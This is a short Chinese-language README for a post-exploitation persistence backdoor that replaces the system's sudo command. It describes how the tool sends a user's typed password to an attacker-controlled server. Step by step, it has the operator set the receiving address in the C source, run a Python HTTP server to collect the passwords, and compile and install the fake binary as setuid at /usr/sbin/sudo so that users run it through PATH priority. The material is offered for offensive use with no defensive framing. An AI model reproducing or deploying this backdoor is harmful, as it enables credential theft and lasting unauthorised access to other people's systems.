# sudo               
一个用来在后渗透持久化阶段利用sudo命令偷取密码的后门程序。               
## 原理               
很多时候通过漏洞利用，我们可以得到目标设备上的操作权限，但是管理员一旦修补了漏洞，那么就前功尽弃了。本工具用来让用户使用sudo命令时将密码自动发送到攻击者的设备上。               
## 使用方法               
step1:参照C代码文件头的注释部分，修改C文件中用于接收密码信息的服务器地址，自行确认是否需要打开sudo的第一次使用提示功能。              
step2:搭建一个简单的http服务器，用来接收后期目标发来的密码信息。使用python就能实现。（python -m SimpleHTTPServer 或python3 -m http.server）               
step3:gcc sudo.c -o sudo && mv sudo /usr/sbin/ ; chmod 4755 /usr/sbin/sudo。利用PATH优先级诱导优先使用我们的程序。              
             
